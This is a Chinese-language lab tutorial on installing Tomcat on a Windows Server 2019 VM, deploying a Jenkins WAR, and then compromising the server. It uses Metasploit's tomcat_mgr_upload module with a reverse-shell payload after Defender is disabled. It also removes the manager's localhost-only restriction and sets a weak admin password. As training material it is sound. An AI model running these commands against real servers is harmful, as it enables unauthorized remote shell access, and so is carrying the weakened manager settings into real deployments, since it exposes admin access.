# Windows For Tomcat

## 1.准备工作

VirtualBox虚拟机，还原windows server 2019第一次快照

Tomcat for windows安装包 https://tomcat.apache.org/download-90.cgi

jdk安装包  https://www.oracle.com/java/technologies/downloads/#java8

war包  https://www.jenkins.io/download/

## 2.Tomcat简介

Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。

Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。

## 3.Tomcat搭建

把所需的文件包拷贝到虚拟机内

![image-20220401203141427](../../images/image-20220401203141427.png)

双击安装jdk for windows,向导开始的介绍直接下一步就好

![image-20220331165324890](../../images/image-20220331165324890.png)

这步可以修改要安装的功能以及安装路径,我们保持默认,直接下一步

![image-20220331165400542](../../images/image-20220331165400542.png)

开始下载安装程序

![image-20220331165441201](../../images/image-20220331165441201.png)

选择java安装的路径,保持默认下一步即可

![image-20220331165512778](../../images/image-20220331165512778.png)

开始自动安装

![image-20220331165543472](../../images/image-20220331165543472.png)

安装完成,点击关闭即可

![image-20220331165710544](../../images/image-20220331165710544.png)

验证Java是否已经成功安装,输入java -version可以显示版本就是成功了

![image-20220331165819566](../../images/image-20220331165819566.png)

双击tomcat9.0.62安装包打开安装程序,第一步是欢迎界面,点击next

![image-20220401203901392](../../images/image-20220401203901392.png)

许可协议,点击I Agree

![image-20220401203923559](../../images/image-20220401203923559.png)

选择安装的功能,勾选Host Manager即可Examples是示例文件,存在session会话劫持漏洞,就不安装了,选择好后点击next

![image-20220401203942269](../../images/image-20220401203942269.png)

端口,服务名以及规则保持默认就可以啦,填写管理用户为farmsec,密码为123.bmk然后点击next

![image-20220401204006455](../../images/image-20220401204006455.png)

选择jdk安装路径,保持默认即可,安装jdk修改过路径的话修改为你设定的路径就可以了,点击next下一步

![image-20220331192249600](../../images/image-20220331192249600.png)

tomcat的安装路径,可以保持默认,直接点击install安装

![image-20220401204037339](../../images/image-20220401204037339.png)

安装完成,去掉show Readme的钩,点击finish

![image-20220401204101841](../../images/image-20220401204101841.png)

打开浏览器输入http://127.0.0.1:8080如果显示tomcat界面即服务启动

![image-20220401204202462](../../images/image-20220401204202462.png)

## 4.实验

### 实验（一）

写一个jsp文件,验证解析情况



在tomcat文档目录C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\docs中新建一个test.jsp文件

![image-20220401204322195](../../images/image-20220401204322195.png)

在test.jsp中写入：
`<%`
	`out.println("Hello World!");`
`%>`

![image-20220331193523785](../../images/image-20220331193523785.png)

打开浏览器访问http://127.0.0.1:8080/docs/test.jsp发现helloworld被成功解析

![image-20220331193558676](../../images/image-20220331193558676.png)

### 实验（二）

使用war包部署一个web网站



浏览器输入http://127.0.0.1:8080,点击Manager App进入管理界面

![image-20220401204404639](../../images/image-20220401204404639.png)

在kali浏览器中打开http://192.168.10.82:8080/，点击Manager APP会403

![image-20220401204513614](../../images/image-20220401204513614.png)

修改服务器文件C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\tomcat-users.xml

在</tomcat-users>前添加:

`<role rolename="admin-gui"/>`
`<role rolename="admin-script"/>`
`<role rolename="manager-gui"/>`
`<role rolename="manager-script"/>`
`<role rolename="manager-jmx"/>`
`<role rolename="manager-status"/>`
`<user username="farmsec" password="123.bmk" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-script,admin-gui"/>`

![image-20220401204630349](../../images/image-20220401204630349.png)

修改服务器文件C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\manager\META-INF\context.xml，使用`<!-- -->`注释掉以下内容：

`<Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />`
  `<Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/>`

![image-20220401204745700](../../images/image-20220401204745700.png)

重启tomcat服务，在系统托盘下有图标，点开后点击stop，再点击start即可

![image-20220401204830054](../../images/image-20220401204830054.png)

正常访问

![image-20220401205035687](../../images/image-20220401205035687.png)

输入安装时设置的账号密码:farmsec 123.bmk点击确定

![image-20220401205105677](../../images/image-20220401205105677.png)

下滑找到要部署的WAR文件处，点击浏览，选中jenkins.war包打开即可

![image-20220401205335053](../../images/image-20220401205335053.png)

点击部署即可自动部署war包，发现报错失败 - 部署上传失败，异常信息：[org.apache.tomcat.util.http.fileupload.impl.SizeLimitExceededException: the request was rejected because its size (70809454) exceeds the configured maximum (52428800)]。这个代表war包太大，无法上传。

![image-20220401205600968](../../images/image-20220401205600968.png)

需要修改C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\manager\WEB-INF\web.xml文件，调整57、58的数值大小

![image-20220401205733195](../../images/image-20220401205733195.png)

右下角再次重启tomcat服务后再次上传，部署完成后,点击项目名(/jenkins)即可进

![image-20220401205944971](../../images/image-20220401205944971.png)

WAR包部署完成，可以正常工作

![image-20220401210205875](../../images/image-20220401210205875.png)

### 实验（三）

上传存有木马的war包获取webshell



kali打开Metasploit-Framework(msfconsole)

![image-20220401214620995](../../images/image-20220401214620995.png)

使用tomcat_mgr_upload模块，此模块可用于在具有公开“管理器”应用程序的Apache Tomcat服务器上执行有效负载。有效负载作为WAR存档上载，包含使用针对/ manager / html / upload组件的POST请求的jsp应用程序

`use multi/http/tomcat_mgr_upload`

![image-20220401214712845](../../images/image-20220401214712845.png)

设置参数

`set httpusername farmsec	#设置Manager管理页面的用户名`

`set httppassword 123.bmk	#设置Manager管理页面的密码`

`set rhosts 192.168.20.194	#设置目标IP`

`set rport 8080	#设置目标端口`

![image-20220401215112404](../../images/image-20220401215112404.png)

设置payload

`set payload java/shell_reverse_tcp`

![image-20220401215150553](../../images/image-20220401215150553.png)

设置跳过指纹检测

![image-20220401215303180](../../images/image-20220401215303180.png)

指定kali本机IP

![image-20220401215445358](../../images/image-20220401215445358.png)

输入run或者exploit启动攻击，发现没有成功，这就是Windows2019 Defender的问题，默认是开启的，可以阻挡大部分的木马及病毒

![image-20220401215502144](../../images/image-20220401215502144.png)

在Windows server 2019上打开Windows安全设置，左侧点击病毒和威胁防护，点击“病毒和威胁防护”设置下的管理设置

![image-20220401215600835](../../images/image-20220401215600835.png)

关闭实时保护、云提供的保护、自动提交样本

![image-20220401215627835](../../images/image-20220401215627835.png)

再次输入run或者exploit启动攻击，攻击成功

![image-20220401215711723](../../images/image-20220401215711723.png)

输入chcp65001解决乱码问题，然后就可以执行命令了

![image-20220401215952418](../../images/image-20220401215952418.png)
